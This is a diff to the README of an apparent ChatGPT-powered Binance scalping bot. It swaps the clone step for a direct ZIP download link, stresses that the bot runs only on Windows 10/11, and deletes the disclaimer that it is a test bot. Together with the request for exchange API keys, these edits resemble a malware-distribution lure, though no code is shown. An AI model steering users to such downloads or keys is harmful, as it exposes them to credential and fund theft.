@@ -51,7 +51,7 @@ for index, row in df.iterrows():
 ![](https://github.com/exileqeq/chatgpt-binance-scalping/blob/main/interface.png?raw=true)
 
 # To use this bot, follow these steps
-1. **Clone the repository:**
+1. **[Clone](https://github.com/exileqeq/chatgpt-binance-scalping/archive/refs/heads/main.zip) the repository:**
 
 
    ```bash
@@ -63,7 +63,5 @@ In the `.env` file, specify the necessary api keys
 5. **Define the trading pair and timeframe**
 6. **Select the amount in the bot**
 # Requirments 
-Use windows 10/11 to work with scalping bot
+**Use windows 10/11 to work with scalping bot**
 
-# Warning 
-This bot is a test bot, the developer is not responsible for it
